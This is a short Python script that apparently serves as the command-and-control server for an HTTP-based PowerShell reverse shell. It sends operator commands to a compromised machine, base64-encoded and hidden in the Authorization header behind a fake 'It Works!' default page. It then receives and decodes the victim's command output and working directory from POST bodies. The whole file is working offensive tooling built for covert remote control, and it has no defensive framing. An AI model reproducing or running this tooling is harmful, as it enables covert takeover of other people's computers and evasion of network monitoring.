#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
from termcolor import colored
import urllib.parse
import time
import readline

HOST = "192.168.29.131"
PORT = 80
 
class myHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        CMD = base64.b64encode(input("PS (AQUI_PWD)>> ").encode())
        self.send_header('Authorization',CMD)
        self.end_headers()
        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        return

    def do_POST(self):
        self.send_response(200)
        content_len = int(self.headers.get('content-length', 0))
        test_data = self.rfile.read(content_len)
        result = (test_data[7:]).decode('utf-8')
    
        try:
            result = urllib.parse.unquote(result)
            result = (base64.b64decode(result)).decode('utf-8')
        except:
            print ("no base 64 result: {}".format(result))
        
        result=result.split('_n1w_')
        if result[0] == "":
            del result[0]
        pwd = result[-1].strip()
        del result[-1] # Deleting pwd from result

        for string in result:
            print(colored(string, 'blue'))

        command = input("PS {}>> ".format(pwd)) + "; pwd"
        CMD = base64.b64encode(command.encode())
        self.send_header('Authorization',CMD.decode('utf-8'))
        self.end_headers()
        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        return
      

try:
    server = HTTPServer((HOST, PORT), myHandler)
    print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))
    server.serve_forever()
 
except KeyboardInterrupt:
    print ('^C received, shutting down the web server')
    server.socket.close()
